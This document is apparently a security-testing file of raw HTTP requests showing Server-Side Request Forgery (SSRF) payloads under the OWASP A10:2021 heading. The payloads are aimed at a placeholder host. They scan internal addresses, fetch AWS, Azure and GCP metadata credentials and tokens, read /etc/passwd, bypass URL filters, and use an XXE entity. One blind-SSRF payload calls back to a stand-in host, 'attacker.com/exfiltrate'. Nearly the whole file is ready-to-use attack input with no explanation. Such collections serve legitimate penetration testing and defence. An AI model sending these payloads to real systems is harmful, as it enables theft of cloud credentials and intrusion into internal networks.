# OWASP Top 10 - A10:2021 Server-Side Request Forgery (SSRF)
# Falsification de requêtes côté serveur

### SSRF - Internal Network Scan
GET /fetch?url=http://192.168.1.1 HTTP/1.1
Host: {{host}}

### SSRF - Cloud Metadata (AWS)
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: {{host}}

### SSRF - Cloud Metadata (Azure)
GET /fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 HTTP/1.1
Host: {{host}}
Metadata: true

### SSRF - Cloud Metadata (GCP)
GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
Host: {{host}}
Metadata-Flavor: Google

### SSRF - Localhost Access
GET /fetch?url=http://localhost:8080/admin HTTP/1.1
Host: {{host}}

### SSRF - File Protocol
GET /fetch?url=file:///etc/passwd HTTP/1.1
Host: {{host}}

### SSRF - DNS Rebinding
GET /fetch?url=http://attacker-controlled-dns.com HTTP/1.1
Host: {{host}}

### SSRF - URL Bypass with @
GET /fetch?url=http://expected.com@169.254.169.254/metadata HTTP/1.1
Host: {{host}}

### SSRF - URL Bypass with Encoding
GET /fetch?url=http://127.0.0.1%2f%2f@169.254.169.254 HTTP/1.1
Host: {{host}}

### SSRF - Blind SSRF
POST /webhook HTTP/1.1
Host: {{host}}
Content-Type: application/json
Content-Length: 50

{"callback_url": "http://attacker.com/exfiltrate"}

### SSRF - PDF Generator
POST /generate-pdf HTTP/1.1
Host: {{host}}
Content-Type: application/json
Content-Length: 80

{"html": "<img src='http://169.254.169.254/latest/meta-data/'>"}

### SSRF - XML External Entity
POST /api/xml HTTP/1.1
Host: {{host}}
Content-Type: application/xml
Content-Length: 180

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<data>&xxe;</data>
